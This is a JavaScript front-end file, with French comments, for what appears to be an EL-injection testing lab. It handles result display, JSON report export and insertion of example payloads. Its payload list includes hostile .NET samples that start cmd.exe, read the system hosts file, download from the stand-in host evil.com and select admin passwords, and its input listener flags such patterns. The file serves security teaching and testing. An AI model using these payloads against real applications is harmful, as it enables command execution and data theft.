// wwwroot/js/el-injection.js

(function () {
    'use strict';

    // Configuration spécifique pour EL Injection
    const config = {
        vulnerabilityType: 'EL INJECTION',
        clearResultsOnChange: true,

        // Callback pour nettoyer les résultats spécifiques à EL
        onClearResults: function () {
            // Masquer toutes les cartes de résultats
            const cards = document.querySelectorAll('.card:not(.border-info):not(.border-secondary)');
            cards.forEach(card => {
                const header = card.querySelector('.card-header');
                if (header && !header.textContent.includes('Syntaxes') && !header.textContent.includes('Objets disponibles')) {
                    card.style.display = 'none';
                }
            });

            // Masquer les alertes spécifiques
            const alerts = document.querySelectorAll('.alert-danger:has(.fa-skull-crossbones), .alert-danger:has(.fa-times-circle), .alert-secondary:not(:has(#payloadExampleContent))');
            alerts.forEach(alert => {
                if (!alert.querySelector('#testHistory') && !alert.querySelector('.container')) {
                    alert.style.display = 'none';
                }
            });

            // Masquer la section résultats
            const resultsSection = document.querySelector('h5 .fa-calculator')?.closest('.mt-4');
            if (resultsSection) resultsSection.style.display = 'none';
        },

        // Callback après initialisation
        onInitialized: function () {
            // Ajouter à l'historique si on a des résultats
            if (window.elInjectionData && window.elInjectionData.hasResults) {
                this.addToHistory(
                    window.elInjectionData.attackType,
                    window.elInjectionData.payload,
                    !window.elInjectionData.hasError
                );
            }

            // Ajouter des tooltips pour les syntaxes
            this.addSyntaxTooltips();
        }
    };

    // Créer l'instance
    const tester = new VulnerabilityTester(config);

    // Ajouter des tooltips pour expliquer les syntaxes
    tester.addSyntaxTooltips = function () {
        // Cette fonction pourrait être étendue pour ajouter des tooltips Bootstrap
        // sur les éléments de syntaxe pour plus d'interactivité
    };

    // Fonction d'export des résultats
    window.exportResults = function () {
        if (!window.elInjectionData || !window.elInjectionData.results || window.elInjectionData.results.length === 0) {
            alert('Aucun résultat à exporter');
            return;
        }

        const result = window.elInjectionData.results[0];

        // Normaliser les propriétés (camelCase/PascalCase)
        const report = {
            timestamp: new Date().toISOString(),
            attackType: window.elInjectionData.attackType,
            expression: {
                original: result.expression || result.Expression,
                evaluated: result.evaluatedValue || result.EvaluatedValue,
                type: result.expressionType || result.ExpressionType
            },
            security: {
                reflectionUsed: result.reflectionUsed || result.ReflectionUsed || false,
                securityImpact: result.securityImpact || result.SecurityImpact || null,
                dangerousPatterns: result.dangerousPatterns || result.DangerousPatterns || []
            },
            access: {
                contextAccessed: result.contextAccessed || result.ContextAccessed || [],
                methodsInvoked: result.methodsInvoked || result.MethodsInvoked || [],
                classesAccessed: result.classesAccessed || result.ClassesAccessed || [],
                processesStarted: result.processesStarted || result.ProcessesStarted || []
            },
            dataExposed: {
                sensitiveData: result.sensitiveDataExposed || result.SensitiveDataExposed || {},
                environmentVariables: result.environmentVariables || result.EnvironmentVariables || {},
                systemProperties: result.systemProperties || result.SystemProperties || {}
            },
            metadata: {
                evaluationTime: result.evaluationTime || result.EvaluationTime || 0,
                compatibleEngines: result.compatibleEngines || result.CompatibleEngines || [],
                bypassTechniques: result.bypassTechniquesUsed || result.BypassTechniquesUsed || []
            }
        };

        // Convertir en JSON formaté
        const json = JSON.stringify(report, null, 2);
        const blob = new Blob([json], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'el_injection_report_' + Date.now() + '.json';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    };

    // Exemples de payloads .NET par catégorie
    window.elPayloadExamples = {
        basic: [
            '7*7',
            'User.Name.ToUpper()',
            'DateTime.Now.ToString("yyyy-MM-dd")'
        ],
        linq: [
            'users.Where(u => u.Role == "Admin").Select(u => u.Password)',
            'data.OrderBy(x => x.Date).First()',
            'list.Any(x => x.IsActive)'
        ],
        reflection: [
            'typeof(System.Diagnostics.Process).GetMethod("Start")',
            'Assembly.Load("System.IO").GetType("System.IO.File")',
            'Activator.CreateInstance(typeof(WebClient))'
        ],
        dangerous: [
            'Process.Start("cmd.exe")',
            'File.ReadAllText(@"C:\\Windows\\System32\\drivers\\etc\\hosts")',
            'new WebClient().DownloadString("http://evil.com")'
        ]
    };

    // Fonction pour insérer un exemple spécifique
    window.insertElExample = function (category, index) {
        if (window.elPayloadExamples[category] && window.elPayloadExamples[category][index]) {
            const payload = window.elPayloadExamples[category][index];
            if (tester.elements.payloadInput) {
                tester.elements.payloadInput.value = payload;
                tester.elements.payloadInput.focus();
                tester.elements.payloadInput.select();
            }
        }
    };

    // Ajouter la détection de syntaxe .NET
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', function () {
            const payloadInput = document.getElementById('payload');
            if (payloadInput) {
                payloadInput.addEventListener('input', function () {
                    // Détecter le type d'expression .NET
                    const value = this.value;
                    let syntaxType = 'Unknown';

                    if (value.includes('.Where(') || value.includes('.Select(')) {
                        syntaxType = 'LINQ';
                        this.style.borderColor = '#28a745';
                    } else if (value.includes('typeof(') || value.includes('.GetMethod(')) {
                        syntaxType = 'Reflection';
                        this.style.borderColor = '#dc3545';
                    } else if (value.includes('Process.Start') || value.includes('File.Read')) {
                        syntaxType = 'Dangerous!';
                        this.style.borderColor = '#dc3545';
                        this.style.borderWidth = '2px';
                    } else if (value.includes('PowerShell')) {
                        syntaxType = 'PowerShell';
                        this.style.borderColor = '#0066cc';
                    } else {
                        this.style.borderColor = '';
                        this.style.borderWidth = '';
                    }
                });
            }
        });
    }

    // Initialisation au chargement
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => tester.initialize());
    } else {
        tester.initialize();
    }
})();